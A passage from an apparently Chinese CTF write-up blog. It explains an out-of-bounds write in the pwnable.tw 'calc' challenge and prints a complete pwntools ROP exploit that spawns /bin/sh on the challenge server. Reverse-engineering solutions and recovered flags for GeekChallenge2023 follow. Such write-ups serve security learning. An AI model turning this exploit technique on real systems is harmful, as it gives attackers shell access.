class="built_in">memcpy</span>(s1, v4, v7);</span><br><span class="line">      s1[v7] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;0&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = atoi(s1);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = (*pool)++;</span><br><span class="line">        pool[v3 + <span class="number">1</span>] = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(i + inputString) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(*(<span class="type">char</span> *)(i + <span class="number">1</span> + inputString) - <span class="number">48</span>) &gt; <span class="number">9</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v4 = i + <span class="number">1</span> + inputString;</span><br><span class="line">      <span class="keyword">if</span> ( operator[v6] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( *(_BYTE *)(i + inputString) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( operator[v6] != <span class="number">43</span> &amp;&amp; operator[v6] != <span class="number">45</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">            operator[++v6] = *(_BYTE *)(i + inputString);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">LABEL_14:</span><br><span class="line">            eval(pool, operator[v6]);</span><br><span class="line">            operator[v6] = *(_BYTE *)(i + inputString);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(pool, operator[v6--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        operator[v6] = *(_BYTE *)(i + inputString);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !*(_BYTE *)(i + inputString) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &gt;= <span class="number">0</span> )</span><br><span class="line">    eval(pool, operator[v6--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点出来eval函数中，从这里可以发现 pool[0]是存储pool中有多少个操作数，通过pool[0] 计算下标取两个操作数的位置，还有计算结果存放的位置。</p>
<p>如果表达式为 + 10的话，这个表达式会变成 pool[1  - 1] +&#x3D; pool[1]，也就是能覆盖pool[0]。由于eval计算表达式是通过pool[0]来计算存储结果的位置，也就是说能控制pool[0] 就能往任意地址写入 表达式的结果，实现一个任意地址值写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pool[*pool - 1] += pool[*pool];</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__cdecl eval(_DWORD *pool, char a2)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // eax</span><br><span class="line"></span><br><span class="line">  if ( a2 == 43 )</span><br><span class="line">  &#123;</span><br><span class="line">    pool[*pool - 1] += pool[*pool];</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 &gt; 43 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a2 == 45 )</span><br><span class="line">    &#123;</span><br><span class="line">      pool[*pool - 1] -= pool[*pool];</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( a2 == 47 )</span><br><span class="line">    &#123;</span><br><span class="line">      pool[*pool - 1] /= (int)pool[*pool];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 == 42 )</span><br><span class="line">  &#123;</span><br><span class="line">    pool[*pool - 1] *= pool[*pool];</span><br><span class="line">  &#125;</span><br><span class="line">  result = pool;</span><br><span class="line">  --*pool;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除了任意地址写外，printf这里是通过 pool作为基地址，偏移pool[0]来取数据打印的，这意味着这里能泄露任意地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( parse_expr((int)s, pool) )</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;%d\n&quot;, pool[pool[0]]);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用思路是，通过ropgadget生成一个rop链，往返回地址写这个rop链，先泄露要写的位置的数据，然后通过sub和add清空这个位置的数据，最后把rop链 add上去。</p>
<p>这个pool距离 rbp的位置是 0x5a0个字节，32位程序返回地址在rbp + 4上。pool是int32类型的，所以偏移为 (0x5a0 + 4) &#x2F; 4 &#x3D; 361</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int pool[101]; // [esp+18h] [ebp-5A0h] BYREF</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./calc&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;chall.pwnable.tw&quot;</span></span><br><span class="line">    port = <span class="number">10100</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ec060</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805c34b</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">payload += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0809b30d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ec064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805c34b</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">payload += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0809b30d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ec068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080550d0</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0809b30d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481d1</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ec060</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080701d1</span>) <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ec068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ec060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ec068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080550d0</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049a21</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">361</span>, <span class="number">361</span> + <span class="built_in">int</span>(<span class="built_in">len</span>(payload) / <span class="number">4</span>)):</span><br><span class="line"></span><br><span class="line">	sl(<span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">	value = <span class="built_in">int</span>(r())</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> value &gt; <span class="number">0</span>:</span><br><span class="line">		payload2 = <span class="string">f&#x27;+<span class="subst">&#123;i&#125;</span>-<span class="subst">&#123;value&#125;</span>+<span class="subst">&#123;u32(payload[(i - <span class="number">361</span>) * <span class="number">4</span>:(i - <span class="number">361</span> + <span class="number">1</span>) * <span class="number">4</span>])&#125;</span>&#x27;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		payload2 = <span class="string">f&#x27;+<span class="subst">&#123;i&#125;</span>+<span class="subst">&#123;-value&#125;</span>+<span class="subst">&#123;u32(payload[(i - <span class="number">361</span>) * <span class="number">4</span>:(i - <span class="number">361</span> + <span class="number">1</span>) * <span class="number">4</span>])&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">	sl(payload2)</span><br><span class="line">	</span><br><span class="line">	r()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-28</span><span class="leancloud_visitors"></span><span>About 2715 words, 9 min 3 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/12/28/GeekChallenge2023/">GeekChallenge2023</a></h3></div><div class="post-content"><div class="card"><p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="点击就送的逆向题"><a href="#点击就送的逆向题" class="headerlink" title="点击就送的逆向题"></a>点击就送的逆向题</h2><p>.S的文件 使用as命令来汇编一下，然后ida打开分析逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">as -o output.o input.S</span><br></pre></td></tr></table></figure>

<p>置反一下逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(s2, <span class="string">&quot;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&quot;</span>);</span><br><span class="line">  _isoc99_scanf(&amp;unk_F4, s1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    s1[i] += <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    byte = <span class="built_in">ord</span>(flag[i]) - <span class="number">7</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(byte),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF&#125;</span><br></pre></td></tr></table></figure>



<h2 id="shiftjmp"><a href="#shiftjmp" class="headerlink" title="shiftjmp"></a>shiftjmp</h2><p>有个jmp的花指令 nop掉后，对着main u p 重新打包main函数反编译</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">33</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( rodata[i] ^ i ^ getchar() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">0x53</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x78</span>, <span class="number">0x53</span>, <span class="number">0x36</span>, <span class="number">0x6A</span>, <span class="number">0x64</span>, <span class="number">0x38</span>, <span class="number">0x64</span>, <span class="number">0x6F</span>, <span class="number">0x54</span>, <span class="number">0x78</span>, <span class="number">0x42</span>, <span class="number">0x51</span>, <span class="number">0x7B</span>, <span class="number">0x78</span>, <span class="number">0x22</span>, <span class="number">0x4D</span>, <span class="number">0x61</span>, <span class="number">0x27</span>, <span class="number">0x63</span>, <span class="number">0x73</span>, <span class="number">0x45</span>, <span class="number">0x2D</span>, <span class="number">0x7C</span>, <span class="number">0x45</span>, <span class="number">0x6C</span>, <span class="number">0x2C</span>, <span class="number">0x6F</span>, <span class="number">0x2F</span>, <span class="number">0x7B</span>, <span class="number">0x5E</span>, <span class="number">0x5C</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    byte = flag[i] ^ i</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(byte),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="幸运数字"><a href="#幸运数字" class="headerlink" title="幸运数字"></a>幸运数字</h2><p>这里的问题，其实是求解 找0xD3范围内的i异或cmp数组 哪个开头是SYC，因为与运算有截断这个特性，所以范围是0xD3</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 cmp_data[<span class="number">41</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> inputString; <span class="comment">// [rsp+54h] [rbp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> lenth; <span class="comment">// [rsp+58h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+5Ch] [rbp-24h]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  qmemcpy(cmp_data, <span class="string">&quot;\r\a&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  cmp_data[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line">  cmp_data[<span class="number">3</span>] = <span class="number">37</span>;</span><br><span class="line">  cmp_data[<span class="number">4</span>] = <span class="number">29</span>;</span><br><span class="line">  cmp_data[<span class="number">5</span>] = <span class="number">110</span>;</span><br><span class="line">  cmp_data[<span class="number">6</span>] = <span class="number">48</span>;</span><br><span class="line">  cmp_data[<span class="number">7</span>] = <span class="number">57</span>;</span><br><span class="line">  cmp_data[<span class="number">8</span>] = <span class="number">44</span>;</span><br><span class="line">  cmp_data[<span class="number">9</span>] = <span class="number">63</span>;</span><br><span class="line">  cmp_data[<span class="number">10</span>] = <span class="number">42</span>;</span><br><span class="line">  cmp_data[<span class="number">11</span>] = <span class="number">43</span>;</span><br><span class="line">  cmp_data[<span class="number">12</span>] = <span class="number">50</span>;</span><br><span class="line">  cmp_data[<span class="number">13</span>] = <span class="number">63</span>;</span><br><span class="line">  cmp_data[<span class="number">14</span>] = <span class="number">42</span>;</span><br><span class="line">  cmp_data[<span class="number">15</span>] = <span class="number">55</span>;</span><br><span class="line">  cmp_data[<span class="number">16</span>] = <span class="number">110</span>;</span><br><span class="line">  cmp_data[<span class="number">17</span>] = <span class="number">48</span>;</span><br><span class="line">  cmp_data[<span class="number">18</span>] = <span class="number">48</span>;</span><br><span class="line">  cmp_data[<span class="number">19</span>] = <span class="number">48</span>;</span><br><span class="line">  cmp_data[<span class="number">20</span>] = <span class="number">48</span>;</span><br><span class="line">  cmp_data[<span class="number">21</span>] = <span class="number">45</span>;</span><br><span class="line">  cmp_data[<span class="number">22</span>] = <span class="number">1</span>;</span><br><span class="line">  cmp_data[<span class="number">23</span>] = <span class="number">7</span>;</span><br><span class="line">  cmp_data[<span class="number">24</span>] = <span class="number">49</span>;</span><br><span class="line">  